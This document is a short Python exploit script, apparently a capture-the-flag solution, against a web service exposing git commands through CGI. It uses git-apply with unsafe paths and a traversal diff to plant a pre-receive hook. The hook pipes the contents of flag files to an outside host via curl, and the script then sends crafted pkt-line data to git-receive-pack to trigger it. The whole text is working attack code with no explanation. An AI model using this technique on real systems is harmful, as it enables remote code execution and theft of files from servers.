import requests, random, sys

URL = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:6969"
GIT = f"/tmp/bitset{random.random()}"

# Create {GIT}
s = requests.Session()
s.get(f"{URL}/cgi-bin/git-init?{GIT}")

# Write to {GIT}/hooks/pre-receive
add = f"""
diff --git a/..{GIT}/.git/hooks/pre-receive b/..{GIT}/.git/hooks/pre-receive
new file mode 100755
--- /dev/null
+++ b/..{GIT}/.git/hooks/pre-receive
@@ -0,0 +1,2 @@
+#!/bin/sh
+curl lp2drty9.requestrepo.com/?`cat /flag*`
"""

# We need --unsafe-paths otherwise it would refuse to write to .git/
try:
    s.post(f"{URL}/cgi-bin/git-apply?--unsafe-paths", data=add, timeout=2)
except:
    print("done")

# We need a valid pkt-line stream twice
for _ in range(2):
    pl = f'{"0"*40} {"0"*40} refs/heads/x\0report-status\n'
    pkt = f"{len(pl)+4:04x}" + pl + "0000"
    print(pkt)
    s.post(f"{URL}/cgi-bin/git-receive-pack?{GIT}", data=pkt)
